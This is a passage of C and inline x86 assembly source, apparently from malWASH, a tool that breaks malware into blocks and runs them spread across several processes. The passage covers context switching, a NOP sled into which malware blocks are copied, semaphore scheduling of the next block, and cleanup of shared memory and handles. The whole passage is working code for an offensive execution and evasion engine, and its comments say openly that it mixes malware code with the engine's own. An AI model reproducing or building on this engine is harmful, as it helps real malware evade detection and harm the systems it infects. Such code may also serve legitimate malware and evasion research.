			// --------------------------------------------------------------------------
			// However, if we load shared stack in the same RVA in all processes, then
			// we don't have to do any relocations.
			// --------------------------------------------------------------------------	
			mov		edx, [eax + CTXOFF_EDX]				// load context of splitted processes 
			mov		ecx, [eax + CTXOFF_ECX]				// 
			mov		ebx, [eax + CTXOFF_EBX]				// 
			mov		esi, [eax + CTXOFF_ESI]				// 
			mov		edi, [eax + CTXOFF_EDI]				// 
			mov		esp, [eax + CTXOFF_ESP]				// 
			mov		ebp, [eax + CTXOFF_EBP]				// 
			push	[eax + CTXOFF_EFL]					// eflags on stack
			popfd										// restore flags to eflags register
			mov		eax, [eax + CTXOFF_EAX]				// finally switch eax
   			nop											// :)
	}	
	
	// -----------------------------------------------------------------------------------------------------
	// We'll copy here the block that we'll execute. Create a nop slep of MAXBLKSIZE (2048) nops after all 
	// required reloctions and context switch, we'll continue the normal execution and we'll reach the 
	// actual basic block of the malware. After we finish, we'll execute some nops until we reach block 
	// epilog, which does our context switch
	// ------------------------------------------------------------------------------------------------------
	__asm {
		jmp		blk_entry_point						// skip the instructions below
			// --------------------------------------------------------------------------
			// a small trick to find th (unknown) address of blk_entry_point
			// --------------------------------------------------------------------------
		find_blk_entry_point:							//
			call	find_blk_entry_point_2				// do another call
			retn										// now, eax contains address of blk_entry_point
		find_blk_entry_point_2:							//
			mov		eax, [esp]							// 
			add		eax, 0x08							// get address of the above instruction
			retn										// 8=(mov + add + ret) length
		blk_entry_point:								// block entry point
	}	 

	#define NOP4    __asm { nop } __asm { nop } __asm { nop } __asm { nop } 
	#define NOP8    NOP4    NOP4
	#define NOP16    NOP8    NOP8
	#define NOP32   NOP16   NOP16
	#define NOP64   NOP32   NOP32
	#define NOP128  NOP64   NOP64
	#define NOP256  NOP128  NOP128
	#define NOP512  NOP256  NOP256
	#define NOP1024 NOP512  NOP512
	#define NOP2048 NOP1024 NOP1024

 	NOP512;												// add nop sled here
 	NOP512;												//
 	NOP512;												// 1536 = MAXBLKSIZE

	// -----------------------------------------------------------------------------------------------------
	// do the context switch (exec epilog)
	//
	//  epilog is right after block, so the epilog will follow the normal execution. Our policy says that 
	//  upon block exit, ebx will contain the ID of the next block. Furthermore the top of the stack will 
	//  contain the saved value of ebx. We have to store that value in context too. 
	// -----------------------------------------------------------------------------------------------------
	__asm {
			push	esi									// we need 1 register. Get a backup
			push	eax									// we need another 1 register
			call	loctrl_backup_rd					// esi = loctrl from local storage
			// we can't use imul because it will affect flags. Thats why we store context offset at prolog
			call	get_exec_local_storage				// get local storage
			mov		eax, ds:[eax + thd_backup]			// eax = nxtthrd
			mov		word ptr[esi+eax*2 + NXTBLKOFF], bx	// loctrl->nxtblk[nxtthrd] = ebx (update next block)
														//
			call	get_exec_local_storage				// get local storage
			mov		eax, ds:[eax + off_backup]			// eax = nxtthrd
														//			
			lea		ebx, [esi + eax + CTXOFF]			// locate stored context (reuse ebx)
			pop		eax									// restore original value of eax & esi
			pop		esi									// 
														//
			mov		[ebx + CTXOFF_EAX], eax				// save context
			mov		[ebx + CTXOFF_EDX], edx				// 
			mov		[ebx + CTXOFF_ECX], ecx				// (don't save ebx)
			mov		[ebx + CTXOFF_ESI], esi				// 
			mov		[ebx + CTXOFF_EDI], edi				// 
														//
			mov		[ebx + CTXOFF_EBP], ebp				// 
			pushfd                                      // eflags on the stack
			pop		dword ptr[ebx + CTXOFF_EFL]			// store eflags
			// pop		eax								// or you can do it this way
			// mov		[ebx + 0x20],	eax				//
														//
			pop		eax									// eax has the stored value ebx
			mov		[ebx + CTXOFF_EBX], eax				// backup ebx finally
			mov		[ebx + CTXOFF_ESP], esp				// and now esp
														//
			call	get_exec_local_storage				// get local storage
			xchg	esp, ds:[eax + esp_backup]			// now restore our saved esp and ebp
			xchg	ebp, ds:[eax + ebp_backup]			// in 1 step ;)
			// --------------------------------------------------------------------------
			// convert virtual esp and ebp back to relative addresses
			// --------------------------------------------------------------------------	
			// mov	ebx, [loctrl]						//  
			// add	ebx, STACKOFF						// find stack RVA
														//
			// mov	eax, [loctrl]						// base address of shared region
			// sub	[eax + CTXOFF + CTXOFF_ESP], ebx	// make esp and ebp point to the relative
			// sub	[eax + CTXOFF + CTXOFF_EBP], ebx	// addresses on the stack 
			// --------------------------------------------------------------------------
			// because we mix malware's code with malWASH's code we have to keep track of last errors
			// --------------------------------------------------------------------------
			call	[GetLastError]						// get last error
			mov		[lasterror], eax					// store lasterror 
			// --------------------------------------------------------------------------
			// release semaphore
			// --------------------------------------------------------------------------
		skip_block_exec:								//
			push	0									// arg3: lpPreviousCount (NULL)
			push	1									// arg2: lReleaseCount (++)
			lea		ebx, [sem]							// address of semaphore array
			mov		ecx, [nxtthrd]						// get next thread id
			push	[ebx + ecx*4]						// arg1: hHandle
			call	[ReleaseSemaphore]					// release semaphore
			mov		edi, ERROR_CANNOT_RELEASE_SEM		// set possible error code
			cmp		eax, 0x00							// zero returned?
			jz		main_closenerror					// if yes, an error happened
			// --------------------------------------------------------------------------
			// check if next block is valid or not
			// --------------------------------------------------------------------------
			// In multithreading malware, it's possible that nxtblk = -1 because of thread exit through "retn"
			mov		edx, [loctrl]						// edx = &loctrl
			mov		ebx, [nxtthrd]						// ebx = nxtthrd
			mov		dx,	word ptr[edx + ebx*2+NXTBLKOFF] // dx = loctrl->nxtblk[nxtthrd]
			test	dx, dx								// loctrl->nxtblk[nxtthrd] == 0? 
			je		main_thread_exit					// if so, set thread to unused
			cmp 	dx, 0xffff							// loctrl->nxtblk[nxtthrd] == -1? 
			je		main_thread_exit					// if so, set thread to unused
			jmp		load_next_block						// now we're finished, go back to fetch next block
														//
		main_thread_exit:								//
			mov		edx, [loctrl]						// edx = &loctrl
			mov		ebx, [nxtthrd]						// ebx = nxtthrd
														// eax = loctrl->thrdst[nxtthrd] = THREAD_SUSPENDED
			mov		word ptr[edx+ebx*2 + THRDSTOFF], THREAD_SUSPENDED	
			jmp		load_next_block						// now we're finished, go back to fetch next block		
	}
	// --------------------------------------------------------------------------
	// Finalize code (clean up)
	// --------------------------------------------------------------------------
	__asm {
			mov		eax, 0x00000000						// success code
			jmp		main_finalize						// skip error
														//
		main_closenerror:								//
			cmp		edi, ERROR_SCHEDULER_INFLOOP		// this error indicates that program finished execution
			jne		main_realerror						//
			xor		edi, edi							// no error
		main_realerror:									//
			push	edi									// backup error code
			// --------------------------------------------------------------------------
			// do the clean up
			// --------------------------------------------------------------------------
		main_finalize:									// do the clean up
			// --------------------------------------------------------------------------
			// detach shared segments from current thread 
			// --------------------------------------------------------------------------
			mov		ebx, [loctrl]						// ebx = loctrl
			movzx	ecx, word ptr[ebx + NSEGMSOFF]		// ecx = loctrl->nsegms
		segmunload_loop:								//
			push	ecx									// backup ecx (UnmapViewOfFile will modify it)
														//
			lea		esi, dword ptr[segmptr]				// get segment table
			lea		esi, [esi + ecx*8 - 8]				// find current index -> sizeof(segmptr_t) = 8
			push	dword ptr [esi]						// get address pointer
			call	[UnmapViewOfFile]					// unmap object
			pop		ecx									// restore counter
			loop	segmunload_loop						// unload next segment				
			// --------------------------------------------------------------------------
			// detach shared control region from current thread
			// --------------------------------------------------------------------------
			push	[loctrl]							//
			call	[UnmapViewOfFile]					// unload shared control region
			// --------------------------------------------------------------------------
			// close open handles and release semaphores (FIX: segment handles will remain open)
			// --------------------------------------------------------------------------
			mov		ecx, NMAXTHREADS					// for each thread
		main_release_sem_loop:							//
			push	ecx									// backup counter
			lea		ebx, [sem]							// address of semaphore array
			push	0									// arg3: lpPreviousCount (NULL)
			push	1									// arg2: lReleaseCount (++)
			push	[ebx + ecx*4 - 4]					// arg1: hSemaphore
			call	[ReleaseSemaphore]					// release semaphore
			pop		ecx									// restore counter
			loop	main_release_sem_loop				// release next semaphore
//-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-
#ifndef __VAR_1_PRELOAD_BLOCKS__						// unload block if preloading is not enabled
			// If you attempt to close an invalid Handle, no problem :)
			push	[hBlkFile]							// block handle on stack
			call	[CloseHandle]						// CloseHandle()	
#endif
//-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-
			push	[hCtrlFile]							// shared mem handle on stack 
			call	[CloseHandle]						// CloseHandle()	
														//
			mov		ecx, NMAXTHREADS					// for each thread
		main_close_sem_loop:							//
			push	ecx									// backup counter
			lea		ebx, [sem]							// address of semaphore array
			push	[ebx + ecx*4 - 4]					// close next semaphore handle
			call	[CloseHandle]						// CloseHandle()
			pop		ecx									// restore counter
			loop	main_close_sem_loop					// close next semaphore
														//
			pop		eax									// get error code from edi				
		main_error:										//
			nop											// no function epilog
	}
 	//-------------------------------------------------------------------------------------------------------
	// end of main()
	//-------------------------------------------------------------------------------------------------------
//-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-
#ifdef __VAR_6_DISPLAY_VERBOSE_INFO__

	__asm { mov [errcode], eax }						// get potential error code

	// if we have an error, print it
	if( errcode ) myprintf( errbuf, errcode, lasterror );
	else myprintf( sucbuf );

#endif
//-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-

	/* execute an idle loop; this is good for debugging */
	__asm {
		idle_loop:										// a return will cause troubles
			nop
			jmp		idle_loop							// prevent crash by idling forever	
	}

	return 0;											// return works only for d
	//-------------------------------------------------------------------------------------------------------
	// add a signature at the end of the function to be able to identify it's end
	//-------------------------------------------------------------------------------------------------------
	__asm {
		O('m','a','l','W','A','S','H','_','e','n','d','s','$','$','$',0)
	}
}
#pragma runtime_checks( "", restore )					// restore _RTC_ calls
//-----------------------------------------------------------------------------------------------------------
#ifdef __0__
_declspec(naked) void empty()
{
	__asm { O('m','a','l','W','A','S','H','_','e','n','d','s','$','$','$',0) }
}
#endif
//-----------------------------------------------------------------------------------------------------------
